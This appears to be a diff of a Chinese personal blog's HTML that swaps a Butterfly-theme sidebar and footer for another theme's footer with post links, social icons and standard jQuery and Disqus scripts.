#999">机器学习</a> <a href="/tags/Hadoop/" style="font-size: 1.1em; color: #999">Hadoop</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 1.1em; color: #999">编码</a> <a href="/tags/%E5%AF%86%E9%92%A5/" style="font-size: 1.1em; color: #999">密钥</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 1.1em; color: #999">系统</a> <a href="/tags/winhex/" style="font-size: 1.1em; color: #999">winhex</a> <a href="/tags/PHP/" style="font-size: 1.27em; color: #99a0a9">PHP</a> <a href="/tags/phpstudy/" style="font-size: 1.1em; color: #999">phpstudy</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.1em; color: #999">博客</a> <a href="/tags/IP/" style="font-size: 1.1em; color: #999">IP</a> <a href="/tags/%E5%AE%9A%E4%B9%89/" style="font-size: 1.21em; color: #999ea4">定义</a> <a href="/tags/CSS/" style="font-size: 1.1em; color: #999">CSS</a> <a href="/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/" style="font-size: 1.1em; color: #999">磁盘管理</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
-    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">106</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-01-15T05:48:16.933Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div><div class="card-widget user-map" id="user-map"><div class="item-headline"><i class="fas fa-heartbeat"></i><span>訪客地圖</span></div><div class="item-content"></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By h3110w0r1d</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    拒绝划水，拒绝摸鱼
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2023%E5%A4%8D%E7%9B%98/">2023复盘</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/">侧信道攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">蓝帽杯半决赛wp_电子取证部分</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/">蓝帽杯半决赛wp_web部分</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/CSS/">CSS</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/CSS/ing/">ing</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/Hadoop/">Hadoop</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/ing/">ing</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao/blog6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://dezhoutorizhao.github.io/blog6/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://dezhoutorizhao.github.io/blog6/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://dezhoutorizhao.github.io/blog6/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:a18888200398@163.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'klugjotest';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
